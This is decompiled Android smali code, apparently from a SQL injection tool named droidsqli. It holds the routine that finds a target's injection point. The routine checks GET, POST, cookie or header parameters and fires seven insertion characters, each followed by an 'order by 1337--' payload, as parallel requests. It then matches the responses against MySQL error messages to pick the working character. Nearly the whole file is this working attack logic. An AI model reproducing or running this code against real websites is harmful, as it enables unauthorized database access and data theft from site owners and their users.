.class Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInsertionCharacter;
.super Lnet/edgard/droidsqli/mvc/model/Stoppable;
.source "InjectionModel.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lnet/edgard/droidsqli/mvc/model/InjectionModel;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x2
    name = "Stoppable_getInsertionCharacter"
.end annotation


# instance fields
.field final synthetic this$0:Lnet/edgard/droidsqli/mvc/model/InjectionModel;


# direct methods
.method public constructor <init>(Lnet/edgard/droidsqli/mvc/model/InjectionModel;Lnet/edgard/droidsqli/mvc/model/InjectionModel;)V
    .locals 0
    .param p2, "model"    # Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    .prologue
    .line 267
    iput-object p1, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInsertionCharacter;->this$0:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    .line 268
    invoke-direct {p0, p2}, Lnet/edgard/droidsqli/mvc/model/Stoppable;-><init>(Lnet/edgard/droidsqli/mvc/model/InjectionModel;)V

    .line 269
    return-void
.end method


# virtual methods
.method public varargs action([Ljava/lang/Object;)Ljava/lang/String;
    .locals 15
    .param p1, "args"    # [Ljava/lang/Object;
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Lnet/edgard/droidsqli/exception/PreparationException;,
            Lnet/edgard/droidsqli/exception/StoppableException;
        }
    .end annotation

    .prologue
    .line 274
    iget-object v8, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInsertionCharacter;->model:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    iget-object v8, v8, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->method:Ljava/lang/String;

    const-string v9, "GET"

    invoke-virtual {v8, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_1

    iget-object v8, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInsertionCharacter;->model:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    iget-object v8, v8, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->getData:Ljava/lang/String;

    if-eqz v8, :cond_0

    iget-object v8, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInsertionCharacter;->model:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    iget-object v8, v8, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->getData:Ljava/lang/String;

    const-string v9, ""

    invoke-virtual {v8, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_1

    .line 275
    :cond_0
    new-instance v8, Lnet/edgard/droidsqli/exception/PreparationException;

    const-string v9, "No query string"

    invoke-direct {v8, v9}, Lnet/edgard/droidsqli/exception/PreparationException;-><init>(Ljava/lang/String;)V

    throw v8

    .line 277
    :cond_1
    iget-object v8, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInsertionCharacter;->model:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    iget-object v8, v8, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->method:Ljava/lang/String;

    const-string v9, "GET"

    invoke-virtual {v8, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_2

    iget-object v8, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInsertionCharacter;->model:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    iget-object v8, v8, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->getData:Ljava/lang/String;

    const-string v9, "[^\\w]*=.*"

    invoke-virtual {v8, v9}, Ljava/lang/String;->matches(Ljava/lang/String;)Z

    move-result v8

    if-eqz v8, :cond_2

    .line 278
    new-instance v8, Lnet/edgard/droidsqli/exception/PreparationException;

    const-string v9, "Bad query string for injection"

    invoke-direct {v8, v9}, Lnet/edgard/droidsqli/exception/PreparationException;-><init>(Ljava/lang/String;)V

    throw v8

    .line 279
    :cond_2
    iget-object v8, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInsertionCharacter;->model:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    iget-object v8, v8, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->method:Ljava/lang/String;

    const-string v9, "POST"

    invoke-virtual {v8, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_3

    iget-object v8, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInsertionCharacter;->model:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    iget-object v8, v8, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->postData:Ljava/lang/String;

    const-string v9, "="

    invoke-virtual {v8, v9}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v8

    if-gez v8, :cond_3

    .line 280
    new-instance v8, Lnet/edgard/droidsqli/exception/PreparationException;

    const-string v9, "Bad POST datas"

    invoke-direct {v8, v9}, Lnet/edgard/droidsqli/exception/PreparationException;-><init>(Ljava/lang/String;)V

    throw v8

    .line 281
    :cond_3
    iget-object v8, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInsertionCharacter;->model:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    iget-object v8, v8, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->method:Ljava/lang/String;

    const-string v9, "COOKIE"

    invoke-virtual {v8, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_4

    iget-object v8, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInsertionCharacter;->model:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    iget-object v8, v8, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->cookieData:Ljava/lang/String;

    const-string v9, "="

    invoke-virtual {v8, v9}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v8

    if-gez v8, :cond_4

    .line 282
    new-instance v8, Lnet/edgard/droidsqli/exception/PreparationException;

    const-string v9, "Bad COOKIE datas"

    invoke-direct {v8, v9}, Lnet/edgard/droidsqli/exception/PreparationException;-><init>(Ljava/lang/String;)V

    throw v8

    .line 283
    :cond_4
    iget-object v8, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInsertionCharacter;->model:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    iget-object v8, v8, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->headerData:Ljava/lang/String;

    const-string v9, ""

    invoke-virtual {v8, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-nez v8, :cond_5

    iget-object v8, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInsertionCharacter;->model:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    iget-object v8, v8, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->headerData:Ljava/lang/String;

    const-string v9, ":"

    invoke-virtual {v8, v9}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v8

    if-gez v8, :cond_5

    .line 284
    new-instance v8, Lnet/edgard/droidsqli/exception/PreparationException;

    const-string v9, "Bad HEADER datas"

    invoke-direct {v8, v9}, Lnet/edgard/droidsqli/exception/PreparationException;-><init>(Ljava/lang/String;)V

    throw v8

    .line 287
    :cond_5
    iget-object v8, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInsertionCharacter;->model:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    iget-object v8, v8, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->method:Ljava/lang/String;

    const-string v9, "GET"

    invoke-virtual {v8, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_6

    iget-object v8, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInsertionCharacter;->model:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    iget-object v8, v8, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->getData:Ljava/lang/String;

    const-string v9, ".*=$"

    invoke-virtual {v8, v9}, Ljava/lang/String;->matches(Ljava/lang/String;)Z

    move-result v8

    if-nez v8, :cond_6

    .line 288
    const-string v8, "(.*=)(.*)"

    invoke-static {v8}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;)Ljava/util/regex/Pattern;

    move-result-object v8

    iget-object v9, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInsertionCharacter;->model:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    iget-object v9, v9, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->getData:Ljava/lang/String;

    invoke-virtual {v8, v9}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v4

    .line 289
    .local v4, "regexSearch":Ljava/util/regex/Matcher;
    invoke-virtual {v4}, Ljava/util/regex/Matcher;->find()Z

    .line 291
    :try_start_0
    iget-object v8, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInsertionCharacter;->model:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    const/4 v9, 0x1

    invoke-virtual {v4, v9}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object v9

    iput-object v9, v8, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->getData:Ljava/lang/String;

    .line 292
    const/4 v8, 0x2

    invoke-virtual {v4, v8}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/IllegalStateException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v8

    .line 359
    .end local v4    # "regexSearch":Ljava/util/regex/Matcher;
    :goto_0
    return-object v8

    .line 293
    .restart local v4    # "regexSearch":Ljava/util/regex/Matcher;
    :catch_0
    move-exception v1

    .line 294
    .local v1, "e":Ljava/lang/IllegalStateException;
    new-instance v8, Lnet/edgard/droidsqli/exception/PreparationException;

    const-string v9, "Incorrect GET format"

    invoke-direct {v8, v9}, Lnet/edgard/droidsqli/exception/PreparationException;-><init>(Ljava/lang/String;)V

    throw v8

    .line 297
    .end local v1    # "e":Ljava/lang/IllegalStateException;
    .end local v4    # "regexSearch":Ljava/util/regex/Matcher;
    :cond_6
    iget-object v8, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInsertionCharacter;->model:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    iget-object v8, v8, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->method:Ljava/lang/String;

    const-string v9, "POST"

    invoke-virtual {v8, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_7

    iget-object v8, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInsertionCharacter;->model:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    iget-object v8, v8, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->postData:Ljava/lang/String;

    const-string v9, ".*=$"

    invoke-virtual {v8, v9}, Ljava/lang/String;->matches(Ljava/lang/String;)Z

    move-result v8

    if-nez v8, :cond_7

    .line 298
    const-string v8, "(.*=)(.*)"

    invoke-static {v8}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;)Ljava/util/regex/Pattern;

    move-result-object v8

    iget-object v9, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInsertionCharacter;->model:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    iget-object v9, v9, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->postData:Ljava/lang/String;

    invoke-virtual {v8, v9}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v4

    .line 299
    .restart local v4    # "regexSearch":Ljava/util/regex/Matcher;
    invoke-virtual {v4}, Ljava/util/regex/Matcher;->find()Z

    .line 301
    :try_start_1
    iget-object v8, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInsertionCharacter;->model:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    const/4 v9, 0x1

    invoke-virtual {v4, v9}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object v9

    iput-object v9, v8, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->postData:Ljava/lang/String;

    .line 302
    const/4 v8, 0x2

    invoke-virtual {v4, v8}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;
    :try_end_1
    .catch Ljava/lang/IllegalStateException; {:try_start_1 .. :try_end_1} :catch_1

    move-result-object v8

    goto :goto_0

    .line 303
    :catch_1
    move-exception v1

    .line 304
    .restart local v1    # "e":Ljava/lang/IllegalStateException;
    new-instance v8, Lnet/edgard/droidsqli/exception/PreparationException;

    const-string v9, "incorrect POST format"

    invoke-direct {v8, v9}, Lnet/edgard/droidsqli/exception/PreparationException;-><init>(Ljava/lang/String;)V

    throw v8

    .line 307
    .end local v1    # "e":Ljava/lang/IllegalStateException;
    .end local v4    # "regexSearch":Ljava/util/regex/Matcher;
    :cond_7
    iget-object v8, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInsertionCharacter;->model:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    iget-object v8, v8, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->method:Ljava/lang/String;

    const-string v9, "COOKIE"

    invoke-virtual {v8, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_8

    iget-object v8, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInsertionCharacter;->model:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    iget-object v8, v8, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->cookieData:Ljava/lang/String;

    const-string v9, ".*=$"

    invoke-virtual {v8, v9}, Ljava/lang/String;->matches(Ljava/lang/String;)Z

    move-result v8

    if-nez v8, :cond_8

    .line 308
    const-string v8, "(.*=)(.*)"

    invoke-static {v8}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;)Ljava/util/regex/Pattern;

    move-result-object v8

    iget-object v9, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInsertionCharacter;->model:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    iget-object v9, v9, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->cookieData:Ljava/lang/String;

    invoke-virtual {v8, v9}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v4

    .line 309
    .restart local v4    # "regexSearch":Ljava/util/regex/Matcher;
    invoke-virtual {v4}, Ljava/util/regex/Matcher;->find()Z

    .line 311
    :try_start_2
    iget-object v8, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInsertionCharacter;->model:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    const/4 v9, 0x1

    invoke-virtual {v4, v9}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object v9

    iput-object v9, v8, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->cookieData:Ljava/lang/String;

    .line 312
    const/4 v8, 0x2

    invoke-virtual {v4, v8}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;
    :try_end_2
    .catch Ljava/lang/IllegalStateException; {:try_start_2 .. :try_end_2} :catch_2

    move-result-object v8

    goto/16 :goto_0

    .line 313
    :catch_2
    move-exception v1

    .line 314
    .restart local v1    # "e":Ljava/lang/IllegalStateException;
    new-instance v8, Lnet/edgard/droidsqli/exception/PreparationException;

    const-string v9, "incorrect Cookie format"

    invoke-direct {v8, v9}, Lnet/edgard/droidsqli/exception/PreparationException;-><init>(Ljava/lang/String;)V

    throw v8

    .line 317
    .end local v1    # "e":Ljava/lang/IllegalStateException;
    .end local v4    # "regexSearch":Ljava/util/regex/Matcher;
    :cond_8
    iget-object v8, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInsertionCharacter;->model:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    iget-object v8, v8, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->method:Ljava/lang/String;

    const-string v9, "HEADER"

    invoke-virtual {v8, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_9

    iget-object v8, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInsertionCharacter;->model:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    iget-object v8, v8, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->headerData:Ljava/lang/String;

    const-string v9, ".*:$"

    invoke-virtual {v8, v9}, Ljava/lang/String;->matches(Ljava/lang/String;)Z

    move-result v8

    if-nez v8, :cond_9

    .line 318
    const-string v8, "(.*:)(.*)"

    invoke-static {v8}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;)Ljava/util/regex/Pattern;

    move-result-object v8

    iget-object v9, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInsertionCharacter;->model:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    iget-object v9, v9, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->headerData:Ljava/lang/String;

    invoke-virtual {v8, v9}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v4

    .line 319
    .restart local v4    # "regexSearch":Ljava/util/regex/Matcher;
    invoke-virtual {v4}, Ljava/util/regex/Matcher;->find()Z

    .line 321
    :try_start_3
    iget-object v8, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInsertionCharacter;->model:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    const/4 v9, 0x1

    invoke-virtual {v4, v9}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object v9

    iput-object v9, v8, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->headerData:Ljava/lang/String;

    .line 322
    const/4 v8, 0x2

    invoke-virtual {v4, v8}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;
    :try_end_3
    .catch Ljava/lang/IllegalStateException; {:try_start_3 .. :try_end_3} :catch_3

    move-result-object v8

    goto/16 :goto_0

    .line 323
    :catch_3
    move-exception v1

    .line 324
    .restart local v1    # "e":Ljava/lang/IllegalStateException;
    new-instance v8, Lnet/edgard/droidsqli/exception/PreparationException;

    const-string v9, "incorrect Header format"

    invoke-direct {v8, v9}, Lnet/edgard/droidsqli/exception/PreparationException;-><init>(Ljava/lang/String;)V

    throw v8

    .line 333
    .end local v1    # "e":Ljava/lang/IllegalStateException;
    .end local v4    # "regexSearch":Ljava/util/regex/Matcher;
    :cond_9
    invoke-static {}, Ljava/util/concurrent/Executors;->newCachedThreadPool()Ljava/util/concurrent/ExecutorService;

    move-result-object v6

    .line 334
    .local v6, "taskExecutor":Ljava/util/concurrent/ExecutorService;
    new-instance v5, Ljava/util/concurrent/ExecutorCompletionService;

    invoke-direct {v5, v6}, Ljava/util/concurrent/ExecutorCompletionService;-><init>(Ljava/util/concurrent/Executor;)V

    .line 335
    .local v5, "taskCompletionService":Ljava/util/concurrent/CompletionService;, "Ljava/util/concurrent/CompletionService<Lnet/edgard/droidsqli/mvc/model/ModelObservable$MyCallable;>;"
    const/4 v8, 0x7

    new-array v9, v8, [Ljava/lang/String;

    const/4 v8, 0x0

    const-string v10, "0"

    aput-object v10, v9, v8

    const/4 v8, 0x1

    const-string v10, "0\'"

    aput-object v10, v9, v8

    const/4 v8, 0x2

    const-string v10, "\'"

    aput-object v10, v9, v8

    const/4 v8, 0x3

    const-string v10, "-1"

    aput-object v10, v9, v8

    const/4 v8, 0x4

    const-string v10, "1"

    aput-object v10, v9, v8

    const/4 v8, 0x5

    const-string v10, "\""

    aput-object v10, v9, v8

    const/4 v8, 0x6

    const-string v10, "-1)"

    aput-object v10, v9, v8

    array-length v10, v9

    const/4 v8, 0x0

    :goto_1
    if-lt v8, v10, :cond_b

    .line 338
    const/4 v7, 0x7

    .line 339
    .local v7, "total":I
    :cond_a
    :goto_2
    if-gtz v7, :cond_c

    .line 359
    const-string v8, "1"

    goto/16 :goto_0

    .line 335
    .end local v7    # "total":I
    :cond_b
    aget-object v2, v9, v8

    .line 336
    .local v2, "insertionCharacter":Ljava/lang/String;
    new-instance v11, Lnet/edgard/droidsqli/mvc/model/ModelObservable$MyCallable;

    iget-object v12, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInsertionCharacter;->this$0:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    new-instance v13, Ljava/lang/StringBuilder;

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v14

    invoke-direct {v13, v14}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v14, "+order+by+1337--+"

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    invoke-virtual {v13}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v13

    invoke-direct {v11, v12, v13, v2}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$MyCallable;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v5, v11}, Ljava/util/concurrent/CompletionService;->submit(Ljava/util/concurrent/Callable;)Ljava/util/concurrent/Future;

    .line 335
    add-int/lit8 v8, v8, 0x1

    goto :goto_1

    .line 342
    .end local v2    # "insertionCharacter":Ljava/lang/String;
    .restart local v7    # "total":I
    :cond_c
    invoke-virtual {p0}, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInsertionCharacter;->isPreparationStopped()Z

    move-result v8

    if-eqz v8, :cond_d

    new-instance v8, Lnet/edgard/droidsqli/exception/StoppableException;

    invoke-direct {v8}, Lnet/edgard/droidsqli/exception/StoppableException;-><init>()V

    throw v8

    .line 344
    :cond_d
    :try_start_4
    invoke-interface {v5}, Ljava/util/concurrent/CompletionService;->take()Ljava/util/concurrent/Future;

    move-result-object v8

    invoke-interface {v8}, Ljava/util/concurrent/Future;->get()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lnet/edgard/droidsqli/mvc/model/ModelObservable$MyCallable;

    .line 345
    .local v0, "currentCallable":Lnet/edgard/droidsqli/mvc/model/ModelObservable$MyCallable;
    add-int/lit8 v7, v7, -0x1

    .line 346
    iget-object v3, v0, Lnet/edgard/droidsqli/mvc/model/ModelObservable$MyCallable;->content:Ljava/lang/String;

    .line 347
    .local v3, "pageSource":Ljava/lang/String;
    const-string v8, ".*Unknown column \'1337\' in \'order clause\'.*"

    const/16 v9, 0x20

    invoke-static {v8, v9}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;I)Ljava/util/regex/Pattern;

    move-result-object v8

    invoke-virtual {v8, v3}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v8

    invoke-virtual {v8}, Ljava/util/regex/Matcher;->matches()Z

    move-result v8

    if-nez v8, :cond_e

    .line 348
    const-string v8, ".*supplied argument is not a valid MySQL result resource.*"

    const/16 v9, 0x20

    invoke-static {v8, v9}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;I)Ljava/util/regex/Pattern;

    move-result-object v8

    invoke-virtual {v8, v3}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v8

    invoke-virtual {v8}, Ljava/util/regex/Matcher;->matches()Z

    move-result v8

    if-eqz v8, :cond_a

    .line 349
    :cond_e
    iget-object v8, v0, Lnet/edgard/droidsqli/mvc/model/ModelObservable$MyCallable;->tag:Ljava/lang/String;
    :try_end_4
    .catch Ljava/lang/InterruptedException; {:try_start_4 .. :try_end_4} :catch_4
    .catch Ljava/util/concurrent/ExecutionException; {:try_start_4 .. :try_end_4} :catch_5

    goto/16 :goto_0

    .line 351
    .end local v0    # "currentCallable":Lnet/edgard/droidsqli/mvc/model/ModelObservable$MyCallable;
    .end local v3    # "pageSource":Ljava/lang/String;
    :catch_4
    move-exception v1

    .line 352
    .local v1, "e":Ljava/lang/InterruptedException;
    invoke-virtual {v1}, Ljava/lang/InterruptedException;->printStackTrace()V

    goto :goto_2

    .line 353
    .end local v1    # "e":Ljava/lang/InterruptedException;
    :catch_5
    move-exception v1

    .line 354
    .local v1, "e":Ljava/util/concurrent/ExecutionException;
    invoke-virtual {v1}, Ljava/util/concurrent/ExecutionException;->printStackTrace()V

    goto :goto_2
.end method
